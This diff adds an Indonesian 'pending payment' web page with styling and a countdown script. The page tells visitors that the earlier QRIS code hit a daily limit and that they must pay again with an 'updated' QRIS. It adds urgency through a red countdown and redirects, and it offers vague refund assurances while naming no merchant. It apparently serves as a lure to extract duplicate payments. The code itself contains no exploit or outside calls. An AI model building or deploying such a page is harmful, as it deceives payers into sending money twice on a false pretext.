@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pembayaran Pending - Informasi Pembayaran</title>
+    <meta name="description" content="Informasi status pembayaran pending dan panduan pembayaran ulang melalui QRIS.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+
+        :root{
+            --primary:#4f46e5;
+            --primary-light:#6366f1;
+            --primary-dark:#3730a3;
+            --accent:#8b5cf6;
+            --text:#0f172a;
+            --muted:#64748b;
+            --border:#e2e8f0;
+            --bg:#f0f2f8;
+            --white:#ffffff;
+            --warning:#f59e0b;
+            --warning-light:#fef3c7;
+            --success:#10b981;
+            --success-light:#d1fae5;
+            --danger:#ef4444;
+            --danger-light:#fee2e2;
+            --shadow-sm:0 2px 8px rgba(15,23,42,.04);
+            --shadow-md:0 8px 30px rgba(15,23,42,.06);
+            --shadow-lg:0 20px 60px rgba(15,23,42,.08),0 4px 16px rgba(15,23,42,.03);
+            --shadow-xl:0 30px 90px rgba(79,70,229,.12),0 8px 24px rgba(15,23,42,.05);
+        }
+
+        html{scroll-behavior:smooth}
+
+        body{
+            font-family:'Plus Jakarta Sans',ui-sans-serif,system-ui,-apple-system,sans-serif;
+            background:var(--bg);
+            color:var(--text);
+            min-height:100vh;
+            display:flex;
+            flex-direction:column;
+            -webkit-font-smoothing:antialiased;
+        }
+
+        /* ══════════ ANIMATED BACKGROUND ══════════ */
+        body::before{
+            content:"";
+            position:fixed;
+            inset:0;
+            z-index:-2;
+            background:
+                radial-gradient(ellipse 80% 50% at 20% -10%,rgba(99,102,241,.12),transparent),
+                radial-gradient(ellipse 60% 50% at 80% 110%,rgba(139,92,246,.08),transparent);
+        }
+
+        body::after{
+            content:"";
+            position:fixed;
+            width:600px;height:600px;
+            border-radius:50%;
+            top:-200px;right:-200px;
+            background:radial-gradient(circle,rgba(99,102,241,.06),transparent 70%);
+            z-index:-1;
+            animation:float-orb 20s ease-in-out infinite;
+        }
+
+        @keyframes float-orb{
+            0%,100%{transform:translate(0,0) scale(1)}
+            50%{transform:translate(-40px,40px) scale(1.1)}
+        }
+
+        /* ══════════ TOP BANNER ══════════ */
+        .top-banner{
+            width:100%;
+            background:rgba(255,255,255,.85);
+            backdrop-filter:blur(20px);
+            -webkit-backdrop-filter:blur(20px);
+            border-bottom:1px solid rgba(226,232,240,.6);
+            padding:16px 20px;
+            position:sticky;
+            top:0;
+            z-index:100;
+        }
+
+        .top-banner img{
+            display:block;
+            width:100%;
+            max-width:1100px;
+            height:auto;
+            max-height:180px;
+            object-fit:contain;
+            margin:0 auto;
+            border-radius:16px;
+        }
+
+        /* ══════════ MAIN ══════════ */
+        main{
+            width:100%;
+            max-width:780px;
+            margin:48px auto;
+            padding:0 20px;
+            flex:1;
+        }
+
+        /* ══════════ CARD ══════════ */
+        .card{
+            background:var(--white);
+            border-radius:28px;
+            overflow:hidden;
+            box-shadow:var(--shadow-xl);
+            border:1px solid rgba(255,255,255,.8);
+            animation:card-enter .7s cubic-bezier(.16,1,.3,1);
+        }
+
+        @keyframes card-enter{
+            from{opacity:0;transform:translateY(30px) scale(.97)}
+            to{opacity:1;transform:translateY(0) scale(1)}
+        }
+
+        .card-glow{
+            height:5px;
+            background:linear-gradient(90deg,#4f46e5,#8b5cf6,#ec4899,#f59e0b,#10b981,#4f46e5);
+            background-size:200% 100%;
+            animation:gradient-shift 4s linear infinite;
+        }
+
+        @keyframes gradient-shift{
+            0%{background-position:0% 50%}
+            100%{background-position:200% 50%}
+        }
+
+        /* ══════════ STATUS HEADER ══════════ */
+        .status-header{
+            text-align:center;
+            padding:48px 32px 32px;
+            position:relative;
+        }
+
+        .status-icon-wrapper{
+            position:relative;
+            width:96px;height:96px;
+            margin:0 auto 24px;
+        }
+
+        .status-icon{
+            width:96px;height:96px;
+            display:flex;align-items:center;justify-content:center;
+            border-radius:28px;
+            background:linear-gradient(135deg,#fff7ed,#fed7aa);
+            color:var(--warning);
+            font-size:42px;
+            font-weight:800;
+            box-shadow:0 12px 30px rgba(245,158,11,.2),inset 0 1px 0 rgba(255,255,255,.8);
+            position:relative;
+            z-index:2;
+        }
+
+        .status-icon-ring{
+            position:absolute;
+            inset:-8px;
+            border-radius:34px;
+            border:2px dashed rgba(245,158,11,.3);
+            animation:spin-slow 20s linear infinite;
+        }
+
+        @keyframes spin-slow{
+            to{transform:rotate(360deg)}
+        }
+
+        .status-badge{
+            display:inline-flex;
+            align-items:center;
+            gap:6px;
+            padding:6px 16px;
+            border-radius:99px;
+            background:var(--warning-light);
+            color:#92400e;
+            font-size:12px;
+            font-weight:700;
+            letter-spacing:.5px;
+            text-transform:uppercase;
+            margin-bottom:14px;
+        }
+
+        .status-badge::before{
+            content:"";
+            width:8px;height:8px;
+            border-radius:50%;
+            background:var(--warning);
+            animation:blink-dot 2s ease-in-out infinite;
+        }
+
+        @keyframes blink-dot{
+            0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(245,158,11,.4)}
+            50%{opacity:.6;box-shadow:0 0 0 6px rgba(245,158,11,0)}
+        }
+
+        .status-header h1{
+            font-size:clamp(26px,5vw,36px);
+            font-weight:800;
+            letter-spacing:-.8px;
+            margin-bottom:12px;
+            background:linear-gradient(135deg,var(--text),#334155);
+            -webkit-background-clip:text;
+            -webkit-text-fill-color:transparent;
+            background-clip:text;
+        }
+
+        .status-header p{
+            color:var(--muted);
+            font-size:15px;
+            line-height:1.75;
+            max-width:540px;
+            margin:0 auto;
+        }
+
+        /* ══════════ CONTENT ══════════ */
+        .content{padding:0 32px 36px}
+
+        /* ══════════ NOTICE ══════════ */
+        .notice{
+            border:1px solid rgba(245,158,11,.25);
+            background:linear-gradient(135deg,#fffbeb,#fef3c7);
+            border-radius:20px;
+            padding:22px;
+            margin-bottom:24px;
+            position:relative;
+            overflow:hidden;
+        }
+
+        .notice::before{
+            content:"";
+            position:absolute;
+            top:0;left:0;
+            width:4px;height:100%;
+            background:linear-gradient(180deg,var(--warning),#f97316);
+            border-radius:0 4px 4px 0;
+        }
+
+        .notice-title{
+            display:flex;align-items:center;gap:10px;
+            font-size:14px;font-weight:800;
+            margin-bottom:10px;
+            color:#92400e;
+            text-transform:uppercase;
+            letter-spacing:.5px;
+        }
+
+        .notice-icon{
+            width:32px;height:32px;
+            display:flex;align-items:center;justify-content:center;
+            border-radius:10px;
+            background:rgba(245,158,11,.15);
+            font-size:16px;
+        }
+
+        .notice p{
+            color:#78350f;
+            font-size:14px;
+            line-height:1.8;
+        }
+
+        .notice strong{color:#92400e;font-weight:700}
+
+        /* ══════════ MESSAGE ══════════ */
+        .message{
+            font-size:15px;
+            line-height:1.9;
+            color:#475569;
+            margin-bottom:28px;
+            padding:20px 24px;
+            background:#f8fafc;
+            border-radius:16px;
+            border-left:4px solid var(--primary);
+        }
+
+        .message strong{
+            color:var(--primary);
+            font-weight:700;
+        }
+
+        /* ══════════ STEPS ══════════ */
+        .steps{
+            border:1px solid var(--border);
+            border-radius:20px;
+            padding:26px;
+            margin-bottom:24px;
+            background:linear-gradient(135deg,#fafbff,#f5f7ff);
+        }
+
+        .steps h2{
+            font-size:17px;
+            font-weight:800;
+            margin-bottom:20px;
+            display:flex;align-items:center;gap:10px;
+        }
+
+        .steps h2 span{
+            width:36px;height:36px;
+            display:flex;align-items:center;justify-content:center;
+            border-radius:12px;
+            background:linear-gradient(135deg,var(--primary),var(--accent));
+            color:#fff;
+            font-size:16px;
+            box-shadow:0 4px 12px rgba(79,70,229,.25);
+        }
+
+        .step{
+            display:flex;gap:16px;
+            margin-bottom:16px;
+            padding:14px;
+            border-radius:14px;
+            background:#ffffff;
+            border:1px solid rgba(226,232,240,.5);
+            transition:all .3s ease;
+        }
+
+        .step:hover{
+            transform:translateX(6px);
+            border-color:rgba(79,70,229,.2);
+            box-shadow:0 4px 16px rgba(79,70,229,.08);
+        }
+
+        .step:last-child{margin-bottom:0}
+
+        .step-number{
+            min-width:38px;height:38px;
+            display:flex;align-items:center;justify-content:center;
+            background:linear-gradient(135deg,#eef2ff,#e0e7ff);
+            color:var(--primary);
+            border-radius:12px;
+            font-size:14px;
+            font-weight:800;
+            box-shadow:0 2px 8px rgba(79,70,229,.1);
+        }
+
+        .step-text{
+            padding-top:7px;
+            font-size:14px;
+            color:#475569;
+            line-height:1.7;
+        }
+
+        .step-text strong{color:var(--text);font-weight:700}
+
+        /* ══════════ REFUND ══════════ */
+        .refund{
+            display:flex;align-items:flex-start;gap:16px;
+            padding:22px;
+            border-radius:20px;
+            background:linear-gradient(135deg,#ecfdf5,#d1fae5);
+            border:1px solid rgba(16,185,129,.2);
+            margin-bottom:28px;
+        }
+
+        .refund-icon{
+            width:44px;height:44px;min-width:44px;
+            display:flex;align-items:center;justify-content:center;
+            border-radius:14px;
+            background:linear-gradient(135deg,var(--success),#059669);
+            color:#fff;
+            font-size:20px;
+            box-shadow:0 6px 16px rgba(16,185,129,.25);
+        }
+
+        .refund h3{
+            font-size:15px;
+            margin-bottom:6px;
+            color:#065f46;
+            font-weight:800;
+        }
+
+        .refund p{
+            color:#047857;
+            font-size:13px;
+            line-height:1.75;
+        }
+
+        .refund strong{font-weight:800}
+
+        /* ══════════ BUTTON ══════════ */
+        .button-wrapper{text-align:center;margin-bottom:28px}
+
+        .payment-button{
+            width:100%;
+            min-height:60px;
+            border:none;
+            border-radius:18px;
+            background:linear-gradient(135deg,var(--primary),var(--primary-dark));
+            color:#fff;
+            font-family:inherit;
+            font-size:16px;
+            font-weight:800;
+            letter-spacing:.3px;
+            cursor:pointer;
+            display:inline-flex;
+            align-items:center;
+            justify-content:center;
+            gap:12px;
+            position:relative;
+            overflow:hidden;
+            transition:transform .25s cubic-bezier(.16,1,.3,1),box-shadow .25s ease;
+            box-shadow:0 12px 30px rgba(79,70,229,.3),inset 0 1px 0 rgba(255,255,255,.15);
+        }
+
+        .payment-button::before{
+            content:"";
+            position:absolute;
+            top:0;left:-100%;
+            width:100%;height:100%;
+            background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);
+            transition:left .6s ease;
+        }
+
+        .payment-button:hover::before{left:100%}
+
+        .payment-button:hover{
+            transform:translateY(-3px);
+            box-shadow:0 18px 40px rgba(79,70,229,.35);
+        }
+
+        .payment-button:active{transform:translateY(-1px)}
+
+        .payment-button:focus-visible{
+            outline:3px solid rgba(79,70,229,.3);
+            outline-offset:3px;
+        }
+
+        .payment-button-icon{
+            width:32px;height:32px;
+            display:flex;align-items:center;justify-content:center;
+            border-radius:50%;
+            background:rgba(255,255,255,.15);
+            font-size:16px;
+            transition:transform .5s ease;
+        }
+
+        .payment-button:hover .payment-button-icon{transform:rotate(180deg)}
+
+        .button-note{
+            color:#94a3b8;
+            font-size:12px;
+            margin-top:14px;
+            line-height:1.6;
+            display:flex;align-items:center;justify-content:center;gap:6px;
+        }
+
+        .button-note::before{content:"🔒";font-size:11px}
+
+        /* ══════════ TIMER ══════════ */
+        .timer-container{
+            position:relative;
+            padding:32px 24px;
+            border-radius:24px;
+            background:linear-gradient(135deg,#1e1b4b,#312e81);
+            text-align:center;
+            overflow:hidden;
+            box-shadow:0 20px 50px rgba(30,27,75,.25),inset 0 1px 0 rgba(255,255,255,.1);
+        }
+
+        .timer-container::before{
+            content:"";
+            position:absolute;
+            width:300px;height:300px;
+            border-radius:50%;
+            background:radial-gradient(circle,rgba(99,102,241,.15),transparent 70%);
+            top:-100px;right:-100px;
+            animation:float-orb 15s ease-in-out infinite;
+        }
+
+        .timer-container::after{
+            content:"";
+            position:absolute;
+            width:200px;height:200px;
+            border-radius:50%;
+            background:radial-gradient(circle,rgba(139,92,246,.1),transparent 70%);
+            bottom:-60px;left:-60px;
+            animation:float-orb 12s ease-in-out infinite reverse;
+        }
+
+        .timer-label{
+            font-size:12px;
+            font-weight:800;
+            color:rgba(255,255,255,.6);
+            text-transform:uppercase;
+            letter-spacing:1.5px;
+            margin-bottom:20px;
+            position:relative;
+            z-index:2;
+        }
+
+        .timer-ring-wrapper{
+            position:relative;
+            width:180px;height:180px;
+            margin:0 auto 16px;
+        }
+
+        .timer-ring-bg{
+            position:absolute;
+            inset:0;
+        }
+
+        .timer-ring-bg circle{
+            fill:none;
+            stroke:rgba(255,255,255,.08);
+            stroke-width:10;
+        }
+
+        .timer-ring-progress{
+            position:absolute;
+            inset:0;
+            transform:rotate(-90deg);
+        }
+
+        .timer-ring-progress circle{
+            fill:none;
+            stroke:url(#timerGradient);
+            stroke-width:10;
+            stroke-linecap:round;
+            stroke-dasharray:502;
+            stroke-dashoffset:0;
+            transition:stroke-dashoffset 1s linear,stroke .3s ease;
+        }
+
+        .timer-ring-progress.danger circle{stroke:url(#timerGradientDanger)}
+
+        .timer-number{
+            position:absolute;
+            inset:0;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            flex-direction:column;
+            z-index:5;
+        }
+
+        .timer-display{
+            font-size:56px;
+            font-weight:800;
+            font-variant-numeric:tabular-nums;
+            color:#ffffff;
+            line-height:1;
+            letter-spacing:-2px;
+            text-shadow:0 4px 20px rgba(0,0,0,.2);
+            transition:color .3s ease;
+        }
+
+        .timer-display.warning{
+            color:#f87171;
+            animation:pulse-danger .8s ease-in-out infinite;
+        }
+
+        @keyframes pulse-danger{
+            0%,100%{transform:scale(1);opacity:1}
+            50%{transform:scale(1.08);opacity:.85}
+        }
+
+        .timer-unit{
+            font-size:11px;
+            font-weight:700;
+            color:rgba(255,255,255,.4);
+            letter-spacing:2px;
+            text-transform:uppercase;
+            margin-top:6px;
+        }
+
+        .timer-sub{
+            font-size:13px;
+            color:rgba(255,255,255,.5);
+            position:relative;
+            z-index:2;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+        }
+
+        .timer-sub-icon{
+            width:8px;height:8px;
+            border-radius:50%;
+            background:var(--accent);
+            animation:blink-dot 1.5s ease-in-out infinite;
+        }
+
+        /* ══════════ FOOTER ══════════ */
+        footer{
+            text-align:center;
+            padding:28px 20px 40px;
+            color:#94a3b8;
+            font-size:12px;
+            line-height:1.7;
+        }
+
+        footer strong{color:#64748b;font-weight:700}
+
+        /* ══════════ FADE OVERLAY ══════════ */
+        .fade-overlay{
+            position:fixed;
+            inset:0;
+            background:#fff;
+            opacity:0;
+            pointer-events:none;
+            transition:opacity .5s ease;
+            z-index:9999;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+        }
+
+        .fade-overlay.active{opacity:1;pointer-events:all}
+
+        .fade-loader{
+            width:48px;height:48px;
+            border:4px solid rgba(79,70,229,.1);
+            border-top-color:var(--primary);
+            border-radius:50%;
+            animation:spin-loader .8s linear infinite;
+        }
+
+        @keyframes spin-loader{to{transform:rotate(360deg)}}
+
+        /* ══════════ MOBILE ══════════ */
+        @media(max-width:600px){
+            .top-banner{padding:12px}
+            .top-banner img{border-radius:12px}
+            main{margin:20px auto;padding:0 14px}
+            .card{border-radius:22px}
+            .status-header{padding:36px 20px 26px}
+            .status-icon-wrapper{width:80px;height:80px}
+            .status-icon{width:80px;height:80px;font-size:34px;border-radius:24px}
+            .content{padding:0 18px 28px}
+            .notice,.steps,.refund{padding:18px}
+            .message{padding:16px 18px}
+            .step{padding:12px}
+            .timer-ring-wrapper{width:150px;height:150px}
+            .timer-display{font-size:46px}
+            .timer-container{padding:26px 20px}
+        }
+
+        /* ══════════ REDUCED MOTION ══════════ */
+        @media(prefers-reduced-motion:reduce){
+            *,*::before,*::after{
+                animation-duration:.01ms!important;
+                animation-iteration-count:1!important;
+                transition-duration:.01ms!important;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="fade-overlay" id="fadeOverlay">
+    <div class="fade-loader"></div>
+</div>
+
+<header class="top-banner">
+    <img src="banner.png" alt="Banner informasi pembayaran">
+</header>
+
+<main>
+    <section class="card">
+        <div class="card-glow"></div>
+
+        <div class="status-header">
+            <div class="status-icon-wrapper">
+                <div class="status-icon-ring"></div>
+                <div class="status-icon" aria-hidden="true">!</div>
+            </div>
+            <div class="status-badge">Status: Pending</div>
+            <h1>Pembayaran Sedang Pending</h1>
+            <p>Mohon maaf atas ketidaknyamanan yang terjadi. Silakan perhatikan informasi pembayaran berikut untuk melanjutkan transaksi Anda.</p>
+        </div>
+
+        <div class="content">
+
+            <div class="notice">
+                <div class="notice-title">
+                    <span class="notice-icon">⚠️</span>
+                    <span>Informasi Penting</span>
+                </div>
+                <p>Pembayaran Anda saat ini berstatus <strong>Pending</strong> karena <strong>QRIS pembayaran telah mencapai limit harian</strong>. Silakan lakukan pembayaran ulang menggunakan QRIS yang telah diperbarui.</p>
+            </div>
+
+            <p class="message">Mohon maaf, transaksi pembayaran Anda belum dapat diproses karena QRIS yang digunakan sebelumnya telah mencapai batas limit transaksi. Untuk melanjutkan proses pembayaran, silakan gunakan <strong>QRIS pembayaran yang telah diperbarui</strong> dan lakukan pembayaran kembali sesuai nominal transaksi.</p>
+
+            <div class="steps">
+                <h2><span>📋</span> Langkah Selanjutnya</h2>
+                <div class="step">
+                    <div class="step-number">01</div>
+                    <div class="step-text">Buka kembali halaman pembayaran dan gunakan <strong>QRIS terbaru</strong> yang tersedia.</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">02</div>
+                    <div class="step-text">Pastikan nominal pembayaran sesuai dengan jumlah transaksi yang harus dibayarkan.</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">03</div>
+                    <div class="step-text">Setelah pembayaran berhasil, status transaksi akan diproses otomatis oleh sistem.</div>
+                </div>
+            </div>
+
+            <div class="refund">
+                <div class="refund-icon">🛡️</div>
+                <div>
+                    <h3>Tidak Perlu Khawatir</h3>
+                    <p>Apabila saldo Anda sempat terpotong namun transaksi tidak berhasil, dana akan dikembalikan secara otomatis. Proses pengembalian memerlukan waktu hingga <strong>1 × 24 jam</strong> tergantung kebijakan bank terkait.</p>
+                </div>
+            </div>
+
+            <div class="button-wrapper">
+                <button type="button" class="payment-button" id="payBtn" aria-label="Lakukan pembayaran ulang">
+                    <span class="payment-button-icon">↻</span>
+                    <span>Lakukan Pembayaran Ulang</span>
+                </button>
+                <div class="button-note">Gunakan hanya QRIS resmi yang ditampilkan pada halaman pembayaran</div>
+            </div>
+
+            <div class="timer-container">
+                <svg width="0" height="0" style="position:absolute">
+                    <defs>
+                        <linearGradient id="timerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#818cf8"/>
+                            <stop offset="100%" stop-color="#c084fc"/>
+                        </linearGradient>
+                        <linearGradient id="timerGradientDanger" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#f87171"/>
+                            <stop offset="100%" stop-color="#ef4444"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+                <div class="timer-label">Redirect Otomatis Dalam</div>
+                <div class="timer-ring-wrapper">
+                    <svg class="timer-ring-bg" viewBox="0 0 180 180">
+                        <circle cx="90" cy="90" r="80"/>
+                    </svg>
+                    <svg class="timer-ring-progress" id="timerRing" viewBox="0 0 180 180">
+                        <circle cx="90" cy="90" r="80" id="timerRingCircle"/>
+                    </svg>
+                    <div class="timer-number">
+                        <div class="timer-display" id="timerDisplay">30</div>
+                        <div class="timer-unit">detik</div>
+                    </div>
+                </div>
+                <div class="timer-sub">
+                    <span class="timer-sub-icon"></span>
+                    <span id="timerMessage">Anda akan diarahkan ke halaman antrian</span>
+                </div>
+            </div>
+
+        </div>
+    </section>
+</main>
+
+<footer>
+    <strong>&copy; 2026 Informasi Pembayaran.</strong><br>
+    Harap pastikan seluruh informasi transaksi sesuai sebelum melakukan pembayaran.
+</footer>
+
+<script>
+(function(){
+    "use strict";
+    var TIME_LIMIT=30,WARNING_AT=10,CIRCUMFERENCE=2*Math.PI*80;
+    var currentSeconds=TIME_LIMIT,timerInterval=null;
+    var timerDisplay=document.getElementById("timerDisplay");
+    var timerRing=document.getElementById("timerRing");
+    var timerRingCircle=document.getElementById("timerRingCircle");
+    var timerMessage=document.getElementById("timerMessage");
+    var payBtn=document.getElementById("payBtn");
+    var fadeOverlay=document.getElementById("fadeOverlay");
+
+    timerRingCircle.style.strokeDasharray=CIRCUMFERENCE;
+
+    function updateTimer(){
+        timerDisplay.textContent=currentSeconds;
+        var offset=CIRCUMFERENCE*(1-currentSeconds/TIME_LIMIT);
+        timerRingCircle.style.strokeDashoffset=offset;
+
+        if(currentSeconds<=WARNING_AT&&currentSeconds>0){
+            timerDisplay.classList.add("warning");
+            timerRing.classList.add("danger");
+            timerMessage.textContent="Segera lakukan pembayaran!";
+        }
+
+        if(currentSeconds<=0){
+            clearInterval(timerInterval);
+            timerDisplay.textContent="0";
+            timerMessage.textContent="Mengalihkan...";
+            smoothRedirect("antrian.html");
+            return;
+        }
+        currentSeconds--;
+    }
+
+    function smoothRedirect(url){
+        fadeOverlay.classList.add("active");
+        setTimeout(function(){
+            window.location.href=url;
+        },600);
+    }
+
+    payBtn.addEventListener("click",function(){
+        if(timerInterval){clearInterval(timerInterval);timerInterval=null;}
+        timerMessage.textContent="Mengalihkan ke pembayaran...";
+        smoothRedirect("payment.html");
+    });
+
+    document.addEventListener("visibilitychange",function(){
+        if(document.hidden&&timerInterval){
+            clearInterval(timerInterval);
+            timerInterval=null;
+        }else if(!document.hidden&&!timerInterval&&currentSeconds>0){
+            timerInterval=setInterval(updateTimer,1000);
+        }
+    });
+
+    window.addEventListener("beforeunload",function(){
+        if(timerInterval){clearInterval(timerInterval);}
+    });
+
+    timerInterval=setInterval(updateTimer,1000);
+})();
+</script>
+
+</body>
+</html>
